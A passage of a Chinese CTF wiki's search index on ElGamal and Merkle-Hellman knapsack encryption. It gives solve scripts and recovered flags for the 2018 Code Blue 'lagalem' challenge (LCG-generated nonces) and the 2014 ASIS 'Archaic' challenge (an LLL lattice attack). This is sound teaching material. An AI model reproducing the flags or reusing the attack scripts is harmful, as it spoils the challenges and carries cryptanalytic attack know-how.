1024 ) sock . close () i += 1 \u6700\u540e\u8feb\u4e8e\u8ba1\u7b97\u673a\u5185\u5b58\u4e0d\u591f\uff0c\uff0c\u6ca1\u8ba1\u7b97\u51fa\u6765\uff0c\uff0c\uff0c\u6709\u65f6\u5019\u4f1a\u5d29\uff0c\u591a\u8fd0\u884c\u51e0\u6b21\u3002\u3002","title":"2015 MMA CTF Alicegame"},{"location":"crypto/asymmetric/discrete-log/elgamal/#2018-code-blue-lagalem","text":"\u9898\u76ee\u63cf\u8ff0\u5982\u4e0b from Crypto.Util.number import * from key import FLAG size = 2048 rand_state = getRandomInteger ( size // 2 ) def keygen ( size ): q = getPrime ( size ) k = 2 while True : p = q * k + 1 if isPrime ( p ): break k += 1 g = 2 while True : if pow ( g , q , p ) == 1 : break g += 1 A = getRandomInteger ( size ) % q B = getRandomInteger ( size ) % q x = getRandomInteger ( size ) % q h = pow ( g , x , p ) return ( g , h , A , B , p , q ), ( x ,) def rand ( A , B , M ): global rand_state rand_state , ret = ( A * rand_state + B ) % M , rand_state return ret def encrypt ( pubkey , m ): g , h , A , B , p , q = pubkey assert 0 < m <= p r = rand ( A , B , q ) c1 = pow ( g , r , p ) c2 = ( m * pow ( h , r , p )) % p return ( c1 , c2 ) # pubkey, privkey = keygen(size) m = bytes_to_long ( FLAG ) c1 , c2 = encrypt ( pubkey , m ) c1_ , c2_ = encrypt ( pubkey , m ) print pubkey print ( c1 , c2 ) print ( c1_ , c2_ ) \u53ef\u4ee5\u770b\u51fa\uff0c\u8be5\u7b97\u6cd5\u5c31\u662f\u4e00\u4e2a ElGamal \u52a0\u5bc6\uff0c\u7ed9\u4e86\u540c\u4e00\u4e2a\u660e\u6587\u4e24\u7ec4\u52a0\u5bc6\u540e\u7684\u7ed3\u679c\uff0c\u5176\u7279\u70b9\u5728\u4e8e\u4f7f\u7528\u7684\u968f\u673a\u6570 r \u662f\u901a\u8fc7\u7ebf\u6027\u540c\u4f59\u751f\u6210\u5668\u751f\u6210\u7684\uff0c\u5219\u6211\u4eec\u77e5\u9053 c2 \\equiv m * h^{r} \\bmod p c2 \\equiv m * h^{r} \\bmod p c2\\_ \\equiv m*h^{(Ar+B) \\bmod q} \\equiv m*h^{Ar+B}\\bmod p c2\\_ \\equiv m*h^{(Ar+B) \\bmod q} \\equiv m*h^{Ar+B}\\bmod p \u5219 c2^A*h^B/c2\\_ \\equiv m^{A-1}\\bmod p c2^A*h^B/c2\\_ \\equiv m^{A-1}\\bmod p \u5176\u4e2d\uff0cc2\uff0cc2_\uff0cA\uff0cB\uff0ch \u5747\u77e5\u9053\u3002\u5219\u6211\u4eec\u77e5\u9053 m^{A-1} \\equiv t \\bmod p m^{A-1} \\equiv t \\bmod p \u6211\u4eec\u5047\u8bbe\u5df2\u77e5 p \u7684\u4e00\u4e2a\u539f\u6839 g\uff0c\u5219\u6211\u4eec\u53ef\u4ee5\u5047\u8bbe g^x \\equiv t g^x \\equiv t g^y \\equiv m g^y \\equiv m \u5219 g^{y(A-1)}\\equiv g^x \\bmod p g^{y(A-1)}\\equiv g^x \\bmod p \u5219 y(A-1) \\equiv x \\bmod p-1 y(A-1) \\equiv x \\bmod p-1 \u8fdb\u800c\u6211\u4eec\u77e5\u9053 y(A-1)-k(p-1)=x y(A-1)-k(p-1)=x \u8fd9\u91cc\u6211\u4eec\u77e5\u9053 A\uff0cp\uff0cx\uff0c\u5219\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u6269\u5c55\u6b27\u51e0\u91cc\u5f97\u5b9a\u7406\u6c42\u5f97 s(A-1)+w(p-1)=gcd(A-1,t-1) s(A-1)+w(p-1)=gcd(A-1,t-1) \u5982\u679cgcd(A-1,t-1)=d\uff0c\u5219\u6211\u4eec\u76f4\u63a5\u8ba1\u7b97 t^s \\equiv m^{s(A-1)} \\equiv m^d \\bmod p t^s \\equiv m^{s(A-1)} \\equiv m^d \\bmod p \u5982\u679c d=1\uff0c\u5219\u76f4\u63a5\u77e5\u9053 m\u3002 \u5982\u679c d \u4e0d\u4e3a1\uff0c\u5219\u5c31\u6709\u70b9\u9ebb\u70e6\u4e86\u3002\u3002 \u8fd9\u91cc\u8fd9\u9053\u9898\u76ee\u4e2d\u6070\u597d d=1\uff0c\u56e0\u6b64\u53ef\u4ee5\u5f88\u5bb9\u6613\u8fdb\u884c\u6c42\u89e3\u3002 import gmpy2 data = open ( './transcript.txt' ) . read () . split ( ' \\n ' ) g , h , A , B , p , q = eval ( data [ 0 ]) c1 , c2 = eval ( data [ 1 ]) c1_ , c2_ = eval ( data [ 2 ]) tmp = gmpy2 . powmod ( c2 , A , p ) * gmpy2 . powmod ( h , B , p ) * gmpy2 . invert ( c2_ , p ) tmp = tmp % p print 't=' , tmp print 'A=' , A print 'p=' , p gg , x , y = gmpy2 . gcdext ( A - 1 , p - 1 ) print gg m = gmpy2 . powmod ( tmp , x , p ) print hex ( m )[ 2 :] . decode ( 'hex' ) flag \u279c 2018 -CodeBlue-lagalem git: ( master ) \u2717 python exp.py t = 24200833701856688878756977616650401715079183425722900529883514170904572086655826119242478732147288453761668954561939121426507899982627823151671207325781939341536650446260662452251070281875998376892857074363464032471952373518723746478141532996553854860936891133020681787570469383635252298945995672350873354628222982549233490189069478253457618473798487302495173105238289131448773538891748786125439847903309001198270694350004806890056215413633506973762313723658679532448729713653832387018928329243004507575710557548103815480626921755313420592693751934239155279580621162244859702224854316335659710333994740615748525806865323 A = 22171697832053348372915156043907956018090374461486719823366788630982715459384574553995928805167650346479356982401578161672693725423656918877111472214422442822321625228790031176477006387102261114291881317978365738605597034007565240733234828473235498045060301370063576730214239276663597216959028938702407690674202957249530224200656409763758677312265502252459474165905940522616924153211785956678275565280913390459395819438405830015823251969534345394385537526648860230429494250071276556746938056133344210445379647457181241674557283446678737258648530017213913802458974971453566678233726954727138234790969492546826523537158 p = 36416598149204678746613774367335394418818540686081178949292703167146103769686977098311936910892255381505012076996538695563763728453722792393508239790798417928810924208352785963037070885776153765280985533615624550198273407375650747001758391126814998498088382510133441013074771543464269812056636761840445695357746189203973350947418017496096468209755162029601945293367109584953080901393887040618021500119075628542529750701055865457182596931680189830763274025951607252183893164091069436120579097006203008253591406223666572333518943654621052210438476603030156263623221155480270748529488292790643952121391019941280923396132717 1 CBCTF { 183a3ce8ed93df613b002252dfc741b2 }","title":"2018 Code Blue lagalem"},{"location":"crypto/asymmetric/discrete-log/elgamal/#_7","text":"https://www.math.auckland.ac.nz/~sgal018/crypto-book/solns.pdf \uff0c20.4.1","title":"\u53c2\u8003"},{"location":"crypto/asymmetric/knapsack/knapsack/","text":"\u80cc\u5305\u52a0\u5bc6 \u00b6 \u80cc\u5305\u95ee\u9898 \u00b6 \u9996\u5148\uff0c\u6211\u4eec\u5148\u6765\u4ecb\u7ecd\u4e00\u4e0b\u80cc\u5305\u95ee\u9898\uff0c\u5047\u5b9a\u4e00\u4e2a\u80cc\u5305\u53ef\u4ee5\u79f0\u91cd W\uff0c\u73b0\u5728\u6709 n \u4e2a\u7269\u54c1\uff0c\u5176\u91cd\u91cf\u5206\u522b\u4e3a a_1, a_2,...,a_n a_1, a_2,...,a_n \u6211\u4eec\u60f3\u95ee\u4e00\u4e0b\u88c5\u54ea\u4e9b\u7269\u54c1\u53ef\u4ee5\u6070\u597d\u4f7f\u5f97\u80cc\u5305\u88c5\u6ee1\uff0c\u5e76\u4e14\u6bcf\u4e2a\u7269\u54c1\u53ea\u80fd\u88ab\u88c5\u4e00\u6b21\u3002\u8fd9\u5176\u5b9e\u5c31\u662f\u5728\u89e3\u8fd9\u6837\u7684\u4e00\u4e2a\u95ee\u9898 x_1a_1+x_2a_2+,...,+x_na_n=W x_1a_1+x_2a_2+,...,+x_na_n=W \u5176\u4e2d\u6240\u6709\u7684 x_i x_i \u53ea\u80fd\u4e3a 0 \u548c 1\u3002\u663e\u7136\u6211\u4eec\u5fc5\u987b\u679a\u4e3e\u6240\u6709\u7684 n \u4e2a\u7269\u54c1\u7684\u7ec4\u5408\u624d\u80fd\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u800c\u590d\u6742\u5ea6\u4e5f\u5c31\u662f 2^n 2^n \uff0c\u8fd9\u4e5f\u5c31\u662f\u80cc\u5305\u52a0\u5bc6\u7684\u5999\u5904\u6240\u5728\u3002 \u5728\u52a0\u5bc6\u65f6\uff0c\u5982\u679c\u6211\u4eec\u60f3\u8981\u52a0\u5bc6\u7684\u660e\u6587\u4e3a x\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u5c06\u5176\u8868\u793a\u4e3a n \u4f4d\u4e8c\u8fdb\u5236\u6570\uff0c\u7136\u540e\u5206\u522b\u4e58\u4e0a a_i a_i \u5373\u53ef\u5f97\u5230\u52a0\u5bc6\u7ed3\u679c\u3002 \u4f46\u662f\u89e3\u5bc6\u7684\u65f6\u5019\uff0c\u8be5\u600e\u4e48\u529e\u5462\uff1f\u6211\u4eec\u786e\u5b9e\u8ba9\u5176\u4ed6\u4eba\u96be\u4ee5\u89e3\u5bc6\u5bc6\u6587\uff0c\u4f46\u662f\u6211\u4eec\u81ea\u5df1\u4e5f\u786e\u5b9e\u6ca1\u6709\u529e\u6cd5\u89e3\u5bc6\u5bc6\u6587\u3002 \u4f46\u662f\u5f53 a_i a_i \u662f\u8d85\u9012\u589e\u7684\u8bdd\uff0c\u6211\u4eec\u5c31\u6709\u529e\u6cd5\u89e3\u4e86\uff0c\u6240\u8c13\u8d85\u9012\u589e\u662f\u6307\u5e8f\u5217\u6ee1\u8db3\u5982\u4e0b\u6761\u4ef6 a_i>\\sum_{k=1}^{i-1}a_k a_i>\\sum_{k=1}^{i-1}a_k \u5373\u7b2c i \u4e2a\u6570\u5927\u4e8e\u524d\u9762\u6240\u6709\u6570\u7684\u548c\u3002 \u4e3a\u4ec0\u4e48\u6ee1\u8db3\u8fd9\u6837\u7684\u6761\u4ef6\u5c31\u53ef\u4ee5\u89e3\u5bc6\u4e86\u5462\uff1f\u8fd9\u662f\u56e0\u4e3a\u5982\u679c\u52a0\u5bc6\u540e\u7684\u7ed3\u679c\u5927\u4e8e a_n a_n \u7684\u8bdd\uff0c\u5176\u524d\u9762\u7684\u7cfb\u6570\u4e3a\u5fc5\u987b 1 \u7684\u3002\u53cd\u4e4b\uff0c\u65e0\u8bba\u5982\u4f55\u4e5f\u65e0\u6cd5\u4f7f\u5f97\u7b49\u5f0f\u6210\u7acb\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u7acb\u9a6c\u5f97\u5230\u5bf9\u5e94\u7684\u660e\u6587\u3002 \u4f46\u662f\uff0c\u8fd9\u6837\u53c8\u51fa\u73b0\u4e86\u4e00\u4e2a\u95ee\u9898\uff0c\u7531\u4e8e a_i a_i \u662f\u516c\u5f00\u7684\uff0c\u5982\u679c\u653b\u51fb\u8005\u622a\u83b7\u4e86\u5bc6\u6587\uff0c\u90a3\u4e48\u5b83\u4e5f\u5c31\u5f88\u5bb9\u6613\u53bb\u7834\u89e3\u8fd9\u6837\u7684\u5bc6\u7801\u3002\u4e3a\u4e86\u5f25\u8865\u8fd9\u6837\u7684\u95ee\u9898\uff0c\u5c31\u51fa\u73b0\u4e86 Merkle\u2013Hellman \u8fd9\u6837\u7684\u52a0\u5bc6\u7b97\u6cd5\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u521d\u59cb\u7684\u80cc\u5305\u96c6\u4f5c\u4e3a\u79c1\u94a5\uff0c\u53d8\u6362\u540e\u7684\u80cc\u5305\u96c6\u4f5c\u4e3a\u516c\u94a5\uff0c\u518d\u7a0d\u5fae\u6539\u52a8\u52a0\u5bc6\u8fc7\u7a0b\uff0c\u5373\u53ef\u3002 \u8fd9\u91cc\u867d\u7136\u8bf4\u4e86\u8d85\u9012\u589e\u5e8f\u5217\uff0c\u4f46\u662f\u5374\u6ca1\u6709\u8bf4\u662f\u5982\u4f55\u751f\u6210\u7684\u3002 Merkle\u2013Hellman \u00b6 \u516c\u79c1\u94a5\u751f\u6210 \u00b6 \u751f\u6210\u79c1\u94a5 \u00b6 \u79c1\u94a5\u5c31\u662f\u6211\u4eec\u7684\u521d\u59cb\u7684\u80cc\u5305\u96c6\uff0c\u8fd9\u91cc\u6211\u4eec\u4f7f\u7528\u8d85\u9012\u589e\u5e8f\u5217\uff0c\u600e\u4e48\u751f\u6210\u5462\uff1f\u6211\u4eec\u53ef\u4ee5\u5047\u8bbe a_1=1 a_1=1 \uff0c\u90a3\u4e48 a_2 a_2 \u5927\u4e8e 1 \u5373\u53ef\uff0c\u7c7b\u4f3c\u7684\u53ef\u4ee5\u4f9d\u6b21\u751f\u6210\u540e\u9762\u7684\u503c\u3002 \u751f\u6210\u516c\u94a5 \u00b6 \u5728\u751f\u6210\u516c\u94a5\u7684\u8fc7\u7a0b\u4e2d\u4e3b\u8981\u4f7f\u7528\u4e86\u6a21\u4e58\u7684\u8fd0\u7b97\u3002 \u9996\u5148\uff0c\u6211\u4eec\u751f\u6210\u6a21\u4e58\u7684\u6a21\u6570 m\uff0c\u8fd9\u91cc\u8981\u786e\u4fdd m>\\sum_{i=1}^{i=n}a_i m>\\sum_{i=1}^{i=n}a_i \u5176\u6b21\uff0c\u6211\u4eec\u9009\u62e9\u6a21\u4e58\u7684\u4e58\u6570 w\uff0c\u4f5c\u4e3a\u79c1\u94a5\u5e76\u4e14\u786e\u4fdd gcd(w,m)=1 gcd(w,m)=1 \u4e4b\u540e\uff0c\u6211\u4eec\u4fbf\u53ef\u4ee5\u901a\u8fc7\u5982\u4e0b\u516c\u5f0f\u751f\u6210\u516c\u94a5 b_i \\equiv w a_i \\bmod m b_i \\equiv w a_i \\bmod m \u5e76\u5c06\u8fd9\u4e2a\u65b0\u7684\u80cc\u5305\u96c6 b_i b_i \u548c m \u4f5c\u4e3a\u516c\u94a5\u3002 \u52a0\u89e3\u5bc6 \u00b6 \u52a0\u5bc6 \u00b6 \u5047\u8bbe\u6211\u4eec\u8981\u52a0\u5bc6\u7684\u660e\u6587\u4e3a v\uff0c\u5176\u6bcf\u4e00\u4e2a\u6bd4\u7279\u4f4d\u4e3a v_i v_i \uff0c\u90a3\u4e48\u6211\u4eec\u52a0\u5bc6\u7684\u7ed3\u679c\u4e3a \\sum_{i=1}^{i=n}b_iv_i \\bmod m \\sum_{i=1}^{i=n}b_iv_i \\bmod m \u89e3\u5bc6 \u00b6 \u5bf9\u4e8e\u89e3\u5bc6\u65b9\uff0c\u9996\u5148\u53ef\u4ee5\u6c42\u7684 w \u5173\u4e8e m \u7684\u9006\u5143 w^{-1} w^{-1} \u3002 \u7136\u540e\u6211\u4eec\u53ef\u4ee5\u5c06\u5f97\u5230\u7684\u5bc6\u6587\u4e58\u4ee5 w^{-1} w^{-1} \u5373\u53ef\u5f97\u5230\u660e\u6587\uff0c\u8fd9\u662f\u56e0\u4e3a \\sum_{i=1}^{i=n}w^{-1}b_iv_i \\bmod m=\\sum_{i=1}^{i=n}a_iv_i \\bmod m \\sum_{i=1}^{i=n}w^{-1}b_iv_i \\bmod m=\\sum_{i=1}^{i=n}a_iv_i \\bmod m \u8fd9\u91cc\u6709 b_i \\equiv w a_i \\bmod m b_i \\equiv w a_i \\bmod m \u5bf9\u4e8e\u6bcf\u4e00\u5757\u7684\u52a0\u5bc6\u7684\u6d88\u606f\u90fd\u662f\u5c0f\u4e8e m \u7684\uff0c\u6240\u4ee5\u6c42\u5f97\u7ed3\u679c\u81ea\u7136\u4e5f\u5c31\u662f\u660e\u6587\u4e86\u3002 \u7834\u89e3 \u00b6 \u8be5\u52a0\u5bc6\u4f53\u5236\u5728\u63d0\u51fa\u540e\u4e24\u5e74\u540e\u8be5\u4f53\u5236\u5373\u88ab\u7834\u8bd1\uff0c\u7834\u8bd1\u7684\u57fa\u672c\u601d\u60f3\u662f\u6211\u4eec\u4e0d\u4e00\u5b9a\u8981\u627e\u51fa\u6b63\u786e\u7684\u4e58\u6570 w\uff08\u5373\u9677\u95e8\u4fe1\u606f\uff09\uff0c\u53ea\u9700\u627e\u51fa\u4efb\u610f\u6a21\u6570 m\u2032 \u548c\u4e58\u6570 w\u2032 \uff0c\u53ea\u8981\u4f7f\u7528 w\u2032 \u53bb\u4e58\u516c\u5f00\u7684\u80cc\u5305\u5411\u91cf B \u65f6\uff0c\u80fd\u591f\u4ea7\u751f\u8d85\u9012\u589e\u7684\u80cc\u5305\u5411\u91cf\u5373\u53ef\u3002 \u4f8b\u5b50 \u00b6 \u8fd9\u91cc\u6211\u4eec\u4ee5 2014 \u5e74 ASIS Cyber Security Contest Quals \u4e2d\u7684 Archaic \u4e3a\u4f8b\uff0c \u9898\u76ee\u94fe\u63a5 \u3002 \u9996\u5148\u67e5\u770b\u6e90\u7a0b\u5e8f secret = 'CENSORED' msg_bit = bin ( int ( secret . encode ( 'hex' ), 16 ))[ 2 :] \u9996\u5148\u5f97\u5230\u4e86 secret \u7684\u6240\u6709\u4e8c\u8fdb\u5236\u4f4d\u3002 \u5176\u6b21\uff0c\u5229\u7528\u5982\u4e0b\u51fd\u6570\u5f97\u5230 keypair\uff0c\u5305\u542b\u516c\u94a5\u4e0e\u79c1\u94a5\u3002 keyPair = makeKey ( len ( msg_bit )) \u4ed4\u7ec6\u5206\u6790 makekey \u51fd\u6570\uff0c\u5982\u4e0b def makeKey ( n ): privKey = [ random . randint ( 1 , 4 ** n )] s = privKey [ 0 ] for i in range ( 1 , n ): privKey . append ( random . randint ( s + 1 , 4 ** ( n + i ))) s += privKey [ i ] q = random . randint ( privKey [ n - 1 ] + 1 , 2 * privKey [ n - 1 ]) r = random . randint ( 1 , q ) while gmpy2 . gcd ( r , q ) != 1 : r = random . randint ( 1 , q ) pubKey = [ r * w % q for w in privKey ] return privKey , q , r , pubKey \u53ef\u4ee5\u770b\u51fa prikey \u662f\u4e00\u4e2a\u8d85\u9012\u589e\u5e8f\u5217\uff0c\u5e76\u4e14\u5f97\u5230\u7684 q \u6bd4 prikey \u4e2d\u6240\u6709\u6570\u7684\u548c\u8fd8\u8981\u5927\uff0c\u6b64\u5916\u6211\u4eec\u5f97\u5230\u7684 r\uff0c\u6070\u597d\u4e0e q \u4e92\u7d20\uff0c\u8fd9\u4e00\u5207\u90fd\u8868\u660e\u4e86\u8be5\u52a0\u5bc6\u662f\u4e00\u4e2a\u80cc\u5305\u52a0\u5bc6\u3002 \u679c\u7136\u52a0\u5bc6\u51fd\u6570\u5c31\u662f\u5bf9\u4e8e\u6d88\u606f\u7684\u6bcf\u4e00\u4f4d\u4e58\u4ee5\u5bf9\u5e94\u7684\u516c\u94a5\u5e76\u6c42\u548c\u3002 def encrypt ( msg , pubKey ): msg_bit = msg n = len ( pubKey ) cipher = 0 i = 0 for bit in msg_bit : cipher += int ( bit ) * pubKey [ i ] i += 1 return bin ( cipher )[ 2 :] \u5bf9\u4e8e\u7834\u89e3\u7684\u811a\u672c\u6211\u4eec\u76f4\u63a5\u4f7f\u7528 GitHub \u4e0a\u7684\u811a\u672c\u3002\u8fdb\u884c\u4e00\u4e9b\u7b80\u5355\u7684\u4fee\u6539\u3002 import binascii # open the public key and strip the spaces so we have a decent array fileKey = open ( \"pub.Key\" , 'rb' ) pubKey = fileKey . read () . replace ( ' ' , '' ) . replace ( 'L' , '' ) . strip ( '[]' ) . split ( ',' ) nbit = len ( pubKey ) # open the encoded message fileEnc = open ( \"enc.txt\" , 'rb' ) encoded = fileEnc . read () . replace ( 'L' , '' ) print \"start\" # create a large matrix of 0's (dimensions are public key length +1) A = Matrix ( ZZ , nbit + 1 , nbit + 1 ) # fill in the identity matrix for i in xrange ( nbit ): A [ i , i ] = 1 # replace the bottom row with your public key for i in xrange ( nbit ): A [ i , nbit ] = pubKey [ i ] # last element is the encoded message A [ nbit , nbit ] = - int ( encoded ) res = A . LLL () for i in range ( 0 , nbit + 1 ): # print solution M = res . row ( i ) . list () flag = True for m in M : if m != 0 and m != 1 : flag = False break if flag : print i , M M = '' . join ( str ( j ) for j in M ) # remove the last bit M = M [: - 1 ] M = hex ( int ( M , 2 ))[ 2 : - 1 ] print M \u8f93\u51fa\u4e4b\u540e\u518d\u89e3\u7801\u4e0b 295 [ 1 , 0 , 0 , 0 , 0 , 0 , 1 , 0 , 1 , 0 , 1 , 0 , 0 , 1 , 1 , 0 , 1 , 0 , 0 , 1 , 0 , 0 , 1 , 0 , 1 , 0 , 1 , 0 , 0 , 1 , 1 , 0 , 1 , 0 , 1 , 1 , 1 , 1 , 1 , 0 , 0 , 1 , 1 , 1 , 0 , 0 , 1 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 0 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 0 , 0 , 0 , 1 , 1 , 0 , 0 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 0 , 0 , 0 , 1 , 1 , 0 , 1 , 0 , 1 , 0 , 1 , 1 , 0 , 0 , 1 , 1 , 0 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 0 , 0 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 0 , 0 , 1 , 1 , 0 , 1 , 0 , 0 , 0 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 0 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 0 , 0 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 1 , 0 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 0 , 0 , 1 , 1 , 1 , 0 , 0 , 1 , 0 , 0 , 1 , 1 , 0 , 1 , 0 , 1 , 0 , 0 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 1 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 0 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 1 , 1 , 0 , 0 , 0 , 0 , 1 , 0 , 0 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 0 , 1 , 1 , 0 , 1 , 1 , 1 , 0 , 0 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 0 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 1 , 0 ] 415349535 f3962643364356664323432323638326331393536383830366130373036316365 >>> import binascii >>> binascii . unhexlify ( '415349535f3962643364356664323432323638326331393536383830366130373036316365' ) 'ASIS_9bd3d5fd2422682c19568806a07061ce' \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6211\u4eec\u5f97\u5230\u7684 LLL \u653b\u51fb\u5f97\u5230\u7684\u77e9\u9635 res \u7684\u53ea\u5305\u542b 01 \u503c\u7684\u884c\u624d\u662f\u6211\u4eec\u60f3\u8981\u7684\u7ed3\u679c\uff0c\u56e0\u4e3a\u6211\u4eec\u5bf9\u4e8e\u660e\u6587\u52a0\u5bc6\u65f6\uff0c\u4f1a\u5c06\u5176\u5206\u89e3\u4e3a\u4e8c\u8fdb\u5236\u6bd4\u7279\u4e32\u3002\u6b64\u5916\uff0c\u6211\u4eec\u8fd8\u9700\u8981\u53bb\u6389\u5bf9\u5e94\u54ea\u4e00\u884c\u7684\u6700\u540e\u4e00\u4e2a\u6570\u5b57\u3002 flag \u662f ASIS_9bd3d5fd2422682c19568806a07061ce \u3002 \u9898\u76ee \u00b6 2017 \u56fd\u8d5b classic","title":"\u80cc\u5305\u52a0\u5bc6"},{"location":"crypto/asymmetric/knapsack/knapsack/#_1","text":"","title":"\u80cc\u5305\u52a0\u5bc6"},{"location":"crypto/asymmetric/knapsack/knapsack/#_2","text":"\u9996\u5148\uff0c\u6211\u4eec\u5148\u6765\u4ecb\u7ecd\u4e00\u4e0b\u80cc\u5305\u95ee\u9898\uff0c\u5047\u5b9a\u4e00\u4e2a\u80cc\u5305\u53ef\u4ee5\u79f0\u91cd W\uff0c\u73b0\u5728\u6709 n \u4e2a\u7269\u54c1\uff0c\u5176\u91cd\u91cf\u5206\u522b\u4e3a a_1, a_2,...,a_n a_1, a_2,...,a_n \u6211\u4eec\u60f3\u95ee\u4e00\u4e0b\u88c5\u54ea\u4e9b\u7269\u54c1\u53ef\u4ee5\u6070\u597d\u4f7f\u5f97\u80cc\u5305\u88c5\u6ee1\uff0c\u5e76\u4e14\u6bcf\u4e2a\u7269\u54c1\u53ea\u80fd\u88ab\u88c5\u4e00\u6b21\u3002\u8fd9\u5176\u5b9e\u5c31\u662f\u5728\u89e3\u8fd9\u6837\u7684\u4e00\u4e2a\u95ee\u9898 x_1a_1+x_2a_2+,...,+x_na_n=W x_1a_1+x_2a_2+,...,+x_na_n=W \u5176\u4e2d\u6240\u6709\u7684 x_i x_i \u53ea\u80fd\u4e3a 0 \u548c 1\u3002\u663e\u7136\u6211\u4eec\u5fc5\u987b\u679a\u4e3e\u6240\u6709\u7684 n \u4e2a\u7269\u54c1\u7684\u7ec4\u5408\u624d\u80fd\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u800c\u590d\u6742\u5ea6\u4e5f\u5c31\u662f 2^n 2^n \uff0c\u8fd9\u4e5f\u5c31\u662f\u80cc\u5305\u52a0\u5bc6\u7684\u5999\u5904\u6240\u5728\u3002 \u5728\u52a0\u5bc6\u65f6\uff0c\u5982\u679c\u6211\u4eec\u60f3\u8981\u52a0\u5bc6\u7684\u660e\u6587\u4e3a x\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u5c06\u5176\u8868\u793a\u4e3a n \u4f4d\u4e8c\u8fdb\u5236\u6570\uff0c\u7136\u540e\u5206\u522b\u4e58\u4e0a a_i a_i \u5373\u53ef\u5f97\u5230\u52a0\u5bc6\u7ed3\u679c\u3002 \u4f46\u662f\u89e3\u5bc6\u7684\u65f6\u5019\uff0c\u8be5\u600e\u4e48\u529e\u5462\uff1f\u6211\u4eec\u786e\u5b9e\u8ba9\u5176\u4ed6\u4eba\u96be\u4ee5\u89e3\u5bc6\u5bc6\u6587\uff0c\u4f46\u662f\u6211\u4eec\u81ea\u5df1\u4e5f\u786e\u5b9e\u6ca1\u6709\u529e\u6cd5\u89e3\u5bc6\u5bc6\u6587\u3002 \u4f46\u662f\u5f53 a_i a_i \u662f\u8d85\u9012\u589e\u7684\u8bdd\uff0c\u6211\u4eec\u5c31\u6709\u529e\u6cd5\u89e3\u4e86\uff0c\u6240\u8c13\u8d85\u9012\u589e\u662f\u6307\u5e8f\u5217\u6ee1\u8db3\u5982\u4e0b\u6761\u4ef6 a_i>\\sum_{k=1}^{i-1}a_k a_i>\\sum_{k=1}^{i-1}a_k \u5373\u7b2c i \u4e2a\u6570\u5927\u4e8e\u524d\u9762\u6240\u6709\u6570\u7684\u548c\u3002 \u4e3a\u4ec0\u4e48\u6ee1\u8db3\u8fd9\u6837\u7684\u6761\u4ef6\u5c31\u53ef\u4ee5\u89e3\u5bc6\u4e86\u5462\uff1f\u8fd9\u662f\u56e0\u4e3a\u5982\u679c\u52a0\u5bc6\u540e\u7684\u7ed3\u679c\u5927\u4e8e a_n a_n \u7684\u8bdd\uff0c\u5176\u524d\u9762\u7684\u7cfb\u6570\u4e3a\u5fc5\u987b 1 \u7684\u3002\u53cd\u4e4b\uff0c\u65e0\u8bba\u5982\u4f55\u4e5f\u65e0\u6cd5\u4f7f\u5f97\u7b49\u5f0f\u6210\u7acb\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u7acb\u9a6c\u5f97\u5230\u5bf9\u5e94\u7684\u660e\u6587\u3002 \u4f46\u662f\uff0c\u8fd9\u6837\u53c8\u51fa\u73b0\u4e86\u4e00\u4e2a\u95ee\u9898\uff0c\u7531\u4e8e a_i a_i \u662f\u516c\u5f00\u7684\uff0c\u5982\u679c\u653b\u51fb\u8005\u622a\u83b7\u4e86\u5bc6\u6587\uff0c\u90a3\u4e48\u5b83\u4e5f\u5c31\u5f88\u5bb9\u6613\u53bb\u7834\u89e3\u8fd9\u6837\u7684\u5bc6\u7801\u3002\u4e3a\u4e86\u5f25\u8865\u8fd9\u6837\u7684\u95ee\u9898\uff0c\u5c31\u51fa\u73b0\u4e86 Merkle\u2013Hellman \u8fd9\u6837\u7684\u52a0\u5bc6\u7b97\u6cd5\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u521d\u59cb\u7684\u80cc\u5305\u96c6\u4f5c\u4e3a\u79c1\u94a5\uff0c\u53d8\u6362\u540e\u7684\u80cc\u5305\u96c6\u4f5c\u4e3a\u516c\u94a5\uff0c\u518d\u7a0d\u5fae\u6539\u52a8\u52a0\u5bc6\u8fc7\u7a0b\uff0c\u5373\u53ef\u3002 